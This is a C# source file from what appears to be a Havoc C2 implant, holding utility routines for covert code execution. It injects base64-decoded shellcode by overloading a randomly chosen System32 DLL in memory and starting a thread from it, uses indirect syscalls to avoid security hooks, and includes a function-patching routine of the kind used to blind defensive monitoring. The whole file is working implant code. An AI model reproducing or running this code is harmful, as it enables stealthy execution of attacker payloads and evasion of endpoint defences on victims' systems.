using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using static HavocImplant.NativeUtils.Structs.Win32;
using static HavocImplant.NativeUtils.Structs.Win32.Enums;
using static System.Collections.Specialized.BitVector32;
using System.Runtime.CompilerServices;

namespace HavocImplant.NativeUtils
{
    /// <summary>
    /// Various functions that are helpful
    /// </summary>
    public class Utils
    {
        public static void inject(string base64Str, dll ntdll)
        {
            byte[] shellcode = Convert.FromBase64String(base64Str);

            IntPtr pBaseAddress = overload(shellcode, ntdll);
            IntPtr hThread = IntPtr.Zero;
            object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, Process.GetCurrentProcess().Handle, pBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
            Thread.Sleep(10000000);
        }

        /// <summary>
        /// Basically what TheWover did. Loads an arbitrary system32 dll (without calling dllmain) and write shellcode in.
        /// </summary>
        /// <param name="shellcode"></param> Byte array of the shellcode
        /// <param name="ntdll"></param>An ntdll instance to do indirect syscalls
        /// <returns>An IntPtr to the base of the dll (where the shellcode is loaded)</returns>
        public static IntPtr overload(byte[] shellcode, dll ntdll)
        {
            int size = shellcode.Length;
            string dllToOverload = "";
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            //Pick a random candidate that meets the requirements

            Random r = new Random();
            //List of candidates that have been considered and rejected
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                //Iterate through the list of files randomly
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                //Check that the size of the module meets requirements
                if (candidates.Contains(rInt) == false && new FileInfo(currentCandidate).Length >= size)
                {
                    dllToOverload = currentCandidate;
                    break;
                }
                candidates.Add(rInt);
            }

            //Overloading time

            //Init the UNICODE_STRING argument for mapview
            Structs.UNICODE_STRING dllName = new Structs.UNICODE_STRING();
            void RtlInitUnicodeString( ref Structs.UNICODE_STRING destinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
            {
                destinationString.Length = (ushort)size;
                destinationString.MaximumLength = (ushort)(size + 2);
                destinationString.Buffer = Marshal.StringToHGlobalUni(SourceString); //write the string into memory
                
            }
            RtlInitUnicodeString(ref dllName, (@"\??\" + dllToOverload));
            //Map it into memory
            IntPtr pDllName = Marshal.AllocHGlobal(Marshal.SizeOf(dllName));
            Marshal.StructureToPtr(dllName, pDllName, true);

            //Initialize Object Attributes
            Structs.OBJECT_ATTRIBUTES objectAttributes = new Structs.OBJECT_ATTRIBUTES();
            objectAttributes.Length = Marshal.SizeOf(objectAttributes);
            objectAttributes.ObjectName = pDllName;
            objectAttributes.Attributes = 0x40; //OBJ_CASE_INSENSITIVE

            Structs.IO_STATUS_BLOCK ioStatusBlock = new Structs.IO_STATUS_BLOCK();

            //grabbing the file handle
            IntPtr hFile = IntPtr.Zero;
            object[] argsNtOpenFile = new object[] { hFile, FileAccessFlags.FILE_READ_DATA | FileAccessFlags.FILE_EXECUTE | FileAccessFlags.FILE_READ_ATTRIBUTES | FileAccessFlags.SYNCHRONIZE, objectAttributes, ioStatusBlock, FileShareFlags.FILE_SHARE_READ | FileShareFlags.FILE_SHARE_DELETE, FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | FileOpenFlags.FILE_NON_DIRECTORY_FILE };
            var retval = ntdll.indirectSyscallInvoke<Delegates.NtOpenFile>("NtOpenFile", argsNtOpenFile);
            hFile = (IntPtr)argsNtOpenFile[0];
            Console.WriteLine("hfile: 0x{0:X}, status code 0x{1:X}", hFile, retval);
            objectAttributes = (Structs.OBJECT_ATTRIBUTES)argsNtOpenFile[2];
            ioStatusBlock = (Structs.IO_STATUS_BLOCK)argsNtOpenFile[3];

            //Creating a section from the file handle
            IntPtr hSection = IntPtr.Zero;
            ulong MaxSize = 0;
            object[] argsNtCreateSection = new object[] { hSection, SECTION_ALL_ACCESS, IntPtr.Zero, MaxSize, PAGE_READONLY, SEC_IMAGE, hFile};
            ntdll.indirectSyscallInvoke<Delegates.NtCreateSection>("NtCreateSection", argsNtCreateSection);
            hSection = (IntPtr)argsNtCreateSection[0];
            MaxSize = (ulong)argsNtCreateSection[3];

            //Mapping View of the section
            IntPtr pBaseAddress = IntPtr.Zero;
            object[] argsNtMapViewOfSection = new object[] { hSection, (IntPtr)(-1), pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, MaxSize, (uint)0x2, (uint)0x0, PAGE_READWRITE };
            ntdll.indirectSyscallInvoke<Delegates.NtMapViewOfSection>("NtMapViewOfSection", argsNtMapViewOfSection);
            pBaseAddress = (IntPtr)argsNtMapViewOfSection[2];
            MaxSize = (ulong)argsNtMapViewOfSection[6];
            

            //Make page writeable
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_READWRITE, (uint)0 });
            
            //Copy shellcode into the mapped dll
            Console.WriteLine("{1} is at 0x{0:X}", (long)pBaseAddress, dllToOverload);
            Marshal.Copy(shellcode, 0, pBaseAddress, size);

            //Change back to executable
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_EXECUTE_READ, (uint)0 });
            return pBaseAddress;
        }

        /// <summary>
        /// Frees a module from memory. Do this on an overloaded module once it has no more use.
        /// </summary>
        /// <param name="ntdll"></param> An ntdll instance
        /// <param name="pBaseAddress"></param> Base address of the module to unload
        public static void freeOverload(dll ntdll, IntPtr pBaseAddress)
        {
            IntPtr regionSize = IntPtr.Zero;
            ntdll.indirectSyscallInvoke<Delegates.NtUnmapViewOfSection>("NtUnmapViewOfSection", new object[] { (IntPtr)(-1), pBaseAddress });
            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, regionSize, (uint)0x8000 });
        }


        /// <summary>
        /// Execute an API in the dll by creating a delegate to it. It is also sorta dogshit since its vulenrable to hooks
        /// </summary>
        /// <typeparam name="T"></typeparam> The Delegate to utilize
        /// <param name="name">Name of the API</param>
        /// <param name="arr"></param> Object array of arguments to pass
        /// <returns>An object that can be casted to the return type of the delegate</returns>
        public static object dynamicAPIInvoke<T>(string dll, string functionName, object[] arguments) where T : Delegate
        {
            IntPtr functionLoc = getFuncLocation(dll, functionName);
            var function = Marshal.GetDelegateForFunctionPointer(functionLoc, typeof(T));
            return function.DynamicInvoke(arguments);
        }

        /// <summary>
        /// Get a function's address from a dll
        /// </summary>
        /// <param name="dll"></param> Name of dll
        /// <param name="functionName"></param> Name of function
        /// <returns></returns>
        public static IntPtr getFuncLocation(string dll, string functionName)
        {
            Type win32Type = typeof(void).Assembly.GetTypes().FirstOrDefault(type => type.FullName == "Microsoft.Win32.Win32Native");
            var win32Properties = win32Type.GetRuntimeProperties();
            var win32Methods = win32Type.GetRuntimeMethods();
            var hGetModuleHandle = win32Methods.FirstOrDefault(type => type.Name == "GetModuleHandle");
            var hGetProcAddress = win32Methods.FirstOrDefault(type => type.Name == "GetProcAddress");

            IntPtr dllLocation = (IntPtr)hGetModuleHandle.Invoke(null, new object[] { dll });

            IntPtr functionLoc = (IntPtr)hGetProcAddress.Invoke(null, new object[] { dllLocation, functionName });
            return functionLoc;
        }
        /// <summary>
        /// Get a function's address from a dll
        /// </summary>
        /// <param name="moduleHandle"></param> Address of Dll
        /// <param name="functionName"></param> Name of function
        /// <returns></returns>
        public static IntPtr getFuncLocation(IntPtr moduleHandle, string functionName)
        {
            Type win32Type = typeof(void).Assembly.GetTypes().FirstOrDefault(type => type.FullName == "Microsoft.Win32.Win32Native");
            var win32Properties = win32Type.GetRuntimeProperties();
            var win32Methods = win32Type.GetRuntimeMethods();
            var hGetProcAddress = win32Methods.FirstOrDefault(type => type.Name == "GetProcAddress");

            IntPtr functionLoc = (IntPtr)hGetProcAddress.Invoke(null, new object[] { moduleHandle, functionName });
            return functionLoc;
        }

        /// <summary>
        /// Patch a function and return the original bytes
        /// </summary>
        /// <param name="ntdll"></param> An ntdll instance to use indirect syscalls
        /// <param name="dllName"></param>Name of dll where the function is located
        /// <param name="functionName"></param>Name of the function
        /// <param name="patch"></param>The byte array with the patch
        /// <returns></returns>
        public static byte[] PatchFunction(dll ntdll, string dllName, string functionName, byte[] patch)
        {
            byte[] originalBytes = new byte[patch.Length];
            IntPtr funcLoc = getFuncLocation(dllName, functionName);
            for (int i = 0; i < patch.Length; i++) originalBytes[i] = Marshal.ReadByte(IntPtr.Add(funcLoc, i));
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), funcLoc, (IntPtr)patch.Length, PAGE_EXECUTE_READWRITE, (uint)0});
            Marshal.Copy(patch, 0, funcLoc, patch.Length);
            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), funcLoc, (IntPtr)patch.Length, PAGE_EXECUTE_READ, (uint)0 });
            return originalBytes;
        }

    }
}
